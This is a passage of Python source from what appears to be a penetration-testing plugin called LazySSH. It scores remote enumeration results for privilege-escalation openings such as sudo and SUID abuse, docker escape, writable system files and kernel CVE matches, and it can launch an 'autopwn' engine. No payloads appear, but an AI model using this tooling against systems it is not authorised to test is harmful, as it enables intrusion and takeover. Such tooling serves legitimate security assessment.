def _evaluate_interesting_backups(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    probe = _get_probe(snapshot, "interesting_files", "backup_files")
    if not probe or not probe.stdout:
        return None
    if "NO_BACKUPS" in probe.stdout:
        return None
    lines = [line.strip() for line in probe.stdout.splitlines() if line.strip()]
    if not lines:
        return None
    detail = f"Found {len(lines)} accessible backup entries"
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=detail,
        evidence=lines[:6],
    )


def _evaluate_recent_modifications(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    probe = _get_probe(snapshot, "interesting_files", "recently_modified")
    if not probe or not probe.stdout:
        return None
    if "NONE_RECENT" in probe.stdout:
        return None
    files = [line.strip() for line in probe.stdout.splitlines() if line.strip()]
    if not files:
        return None
    detail = f"Found {len(files)} recently modified files in sensitive locations"
    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=detail,
        evidence=files[:6],
    )


def _evaluate_kernel_exploits(
    snapshot: EnumerationSnapshot, meta: PriorityHeuristic
) -> PriorityFinding | None:
    """Check running kernel version against known CVE database."""
    kernel_probe = _get_probe(snapshot, "system", "kernel")
    if not kernel_probe or not kernel_probe.stdout.strip():
        return None

    kernel_version = kernel_probe.stdout.strip().split()[0]
    matches = suggest_exploits(kernel_version)
    if not matches:
        return None

    evidence = [f"{e.cve} — {e.name}: {e.description}" for e in matches[:6]]
    exploit_cmds = [f"# {e.cve} ({e.name}): {e.reference_url}" for e in matches[:6]]

    return PriorityFinding(
        key=meta.key,
        category=meta.category,
        severity=meta.severity,
        headline=meta.headline,
        detail=f"Kernel {kernel_version} matches {len(matches)} known exploit(s)",
        evidence=evidence,
        exploitation_difficulty="moderate",
        exploit_commands=exploit_cmds,
    )


HEURISTIC_EVALUATORS = {
    "sudo_membership": _evaluate_sudo_membership,
    "passwordless_sudo": _evaluate_passwordless_sudo,
    "suid_binaries": _evaluate_suid_binaries,
    "world_writable_dirs": _evaluate_world_writable,
    "exposed_network_services": _evaluate_exposed_services,
    "weak_ssh_configuration": _evaluate_weak_ssh,
    "suspicious_scheduled_tasks": _evaluate_suspicious_scheduled,
    "kernel_drift": _evaluate_kernel_drift,
    "dangerous_capabilities": _evaluate_dangerous_capabilities,
    "writable_passwd_file": _evaluate_writable_passwd_file,
    "docker_escape": _evaluate_docker_escape,
    "writable_service_files": _evaluate_writable_service_files,
    "credential_exposure": _evaluate_credential_exposure,
    "gtfobins_sudo": _evaluate_gtfobins_sudo,
    "gtfobins_suid": _evaluate_gtfobins_suid,
    "writable_path": _evaluate_writable_path,
    "writable_cron_files": _evaluate_writable_cron_files,
    "nfs_no_root_squash": _evaluate_nfs_no_root_squash,
    "ld_preload_hijack": _evaluate_ld_preload_hijack,
    "container_detected": _evaluate_container_detected,
    "cloud_environment": _evaluate_cloud_environment,
    "interesting_backups": _evaluate_interesting_backups,
    "recent_modifications": _evaluate_recent_modifications,
    "kernel_exploits": _evaluate_kernel_exploits,
}


def generate_priority_findings(snapshot: EnumerationSnapshot) -> list[PriorityFinding]:
    findings: list[PriorityFinding] = []
    for heuristic in PRIORITY_HEURISTICS:
        evaluator = HEURISTIC_EVALUATORS.get(heuristic.key)
        if not evaluator:  # pragma: no cover - heuristic lookup
            continue
        finding = evaluator(snapshot, heuristic)
        if finding:
            findings.append(finding)
    return findings


def render_plain(snapshot: EnumerationSnapshot, findings: Sequence[PriorityFinding]) -> str:
    lines: list[str] = []
    lines.append("LazySSH Enumeration Summary")
    lines.append("=" * 80)
    lines.append(f"Collected: {snapshot.collected_at.isoformat(timespec='seconds')}")
    lines.append("")
    lines.append("Priority Findings:")
    if not findings:
        lines.append("- None detected by heuristics.")
    else:
        for finding in findings:
            lines.append(f"- [{finding.severity.upper()}] {finding.headline}")
            lines.append(f"  {finding.detail}")
            for evidence in finding.evidence[:4]:
                lines.append(f"    • {evidence}")
    if snapshot.warnings:
        lines.append("")
        lines.append("Warnings:")
        for warning in snapshot.warnings:
            lines.append(f"- {warning}")
    lines.append("")
    lines.append("Category Highlights:")
    for category in SELECTED_CATEGORY_ORDER:
        category_results = snapshot.probes.get(category)
        if not category_results:
            continue
        lines.append(f"[{category.upper()}]")
        for key, result in sorted(category_results.items()):
            summary = _summarize_text(result.stdout)
            lines.append(f"- {key}: {summary}")
            if result.status != 0 and result.stderr.strip():
                first_error = _first_nonempty_line(result.stderr)
                lines.append(f"  ! exit {result.status}: {first_error}")
        lines.append("")
    report = "\n".join(lines).rstrip() + "\n"
    return report


def render_rich(snapshot: EnumerationSnapshot, findings: Sequence[PriorityFinding]) -> None:
    if (
        Table is None or Panel is None or Text is None or box is None
    ):  # pragma: no cover - Rich unavailable
        console.print(render_plain(snapshot, findings))
        return

    console.rule("[header]LazySSH Enumeration[/header]")

    summary_table = Table(box=box.ROUNDED, expand=True, show_header=True, padding=(0, 1))
    summary_table.add_column(
        "Severity", justify="center", style="panel.title", no_wrap=True, width=9
    )
    summary_table.add_column("Finding", style="foreground", overflow="fold", ratio=2, min_width=24)
    summary_table.add_column("Detail", style="dim", overflow="fold", ratio=3, min_width=32)

    if findings:
        for finding in findings:
            style = SEVERITY_STYLES.get(finding.severity, "foreground")
            summary_table.add_row(
                f"[{style}]{finding.severity.upper()}[/]",
                finding.headline,
                finding.detail,
            )
    else:
        summary_table.add_row(
            "[info]INFO[/]", "No priority findings", "Heuristics did not flag elevated risk."
        )

    console.print(
        Panel(
            summary_table,
            title="[panel.title]Priority Findings[/panel.title]",
            border_style="border",
            box=box.ROUNDED,
            padding=(1, 2),
            expand=True,
        )
    )

    for category in SELECTED_CATEGORY_ORDER:
        category_results = snapshot.probes.get(category)
        if not category_results:
            continue
        table = Table(box=box.MINIMAL_DOUBLE_HEAD, expand=True, show_header=True, padding=(0, 1))
        table.add_column("Check", style="accent", no_wrap=True)
        table.add_column("Summary", style="foreground", overflow="fold", ratio=5, min_width=48)
        table.add_column(
            "Status",
            style="dim",
            justify="center",
            no_wrap=True,
            width=8,
        )
        for key, result in sorted(category_results.items()):
            summary = _summarize_text(result.stdout)
            status_style = "success" if result.status == 0 else "error"
            status_icon = "✔" if result.status == 0 else "✖"
            summary_text = Text(summary, style="foreground")
            if result.status != 0 and result.stderr.strip():
                first_error = _first_nonempty_line(result.stderr)
                summary_text.append("\n", style="foreground")
                summary_text.append(f"exit {result.status}: {first_error}", style="error")
            table.add_row(
                f"[accent]{key}[/accent]",
                summary_text,
                f"[{status_style}]{status_icon}[/]",
            )
        console.print(
            Panel(
                table,
                title=f"[panel.title]{category.capitalize()}[/panel.title]",
                border_style="border",
                box=box.ROUNDED,
                padding=(1, 2),
                expand=True,
            )
        )

    if snapshot.warnings:
        console.print(
            Panel(
                "\n".join(snapshot.warnings),
                title="[panel.title]Warnings[/panel.title]",
                border_style="warning",
                box=box.ROUNDED,
                padding=(1, 2),
                expand=True,
            )
        )


def build_json_payload(
    snapshot: EnumerationSnapshot, findings: Sequence[PriorityFinding], plain_report: str
) -> dict[str, Any]:
    categories: dict[str, dict[str, Any]] = {}
    for category, mapping in snapshot.probes.items():
        categories[category] = {key: probe.to_dict() for key, probe in mapping.items()}

    return {
        "collected_at": snapshot.collected_at.isoformat(timespec="seconds"),
        "priority_findings": [finding.to_dict() for finding in findings],
        "categories": categories,
        "warnings": snapshot.warnings,
        "summary_text": plain_report.strip(),
        "probe_count": sum(len(mapping) for mapping in snapshot.probes.values()),
    }


def _resolve_log_dir() -> Path:
    connection_name = os.environ.get("LAZYSSH_CONNECTION_NAME") or os.environ.get(
        "LAZYSSH_SOCKET", "unknown"
    )
    if connection_name and "/" in connection_name:
        connection_name = Path(connection_name).name
    template = CONNECTION_LOG_DIR_TEMPLATE or "/tmp/lazyssh/{connection_name}.d/logs"
    path = Path(template.format(connection_name=connection_name))
    try:
        path.mkdir(parents=True, exist_ok=True)
        return path
    except Exception:
        fallback = Path("/tmp/lazyssh/logs")
        fallback.mkdir(parents=True, exist_ok=True)
        return fallback


def write_artifacts(
    snapshot: EnumerationSnapshot,
    findings: Sequence[PriorityFinding],
    plain_report: str,
    json_payload: Mapping[str, Any],
    is_json_output: bool,
) -> tuple[Path, Path | None]:
    log_dir = _resolve_log_dir()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    json_path = log_dir / f"survey_{timestamp}.json"
    json_path.write_text(json.dumps(json_payload, indent=2), encoding="utf-8")

    txt_path: Path | None = None
    if not is_json_output:
        txt_path = log_dir / f"survey_{timestamp}.txt"
        txt_path.write_text(plain_report, encoding="utf-8")

    return json_path, txt_path


def main() -> int:  # pragma: no cover - CLI entry point
    ui_config = get_ui_config()
    use_plain = ui_config.get("plain_text") or ui_config.get("no_rich")
    is_json_output = "--json" in sys.argv
    is_autopwn = "--autopwn" in sys.argv
    is_dry_run = "--dry-run" in sys.argv

    try:
        snapshot = collect_remote_snapshot()
    except RemoteExecutionError as exc:
        error_message = f"Enumeration failed: {exc}"
        print(error_message, file=sys.stderr)
        if exc.stderr:
            print(exc.stderr, file=sys.stderr)
        return 1

    findings = generate_priority_findings(snapshot)
    plain_report = render_plain(snapshot, findings)
    json_payload = build_json_payload(snapshot, findings, plain_report)

    if is_json_output:
        sys.stdout.write(json.dumps(json_payload, indent=2))
        sys.stdout.write("\n")
    elif not use_plain:
        render_rich(snapshot, findings)
    else:
        console.print(plain_report)

    json_path, txt_path = write_artifacts(
        snapshot, findings, plain_report, json_payload, is_json_output
    )

    if not is_json_output:
        console.print(f"[success]Saved survey to {json_path}[/success]")
        if txt_path:
            console.print(f"[dim]Plain-text copy: {txt_path}[/dim]")

    if is_autopwn:
        from lazyssh.plugins._autopwn import AutopwnEngine

        engine = AutopwnEngine(snapshot, findings, dry_run=is_dry_run)
        engine.run()

    return 0


if __name__ == "__main__":  # pragma: no cover - CLI entry point
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\nEnumeration interrupted by user", file=sys.stderr)
        sys.exit(130)
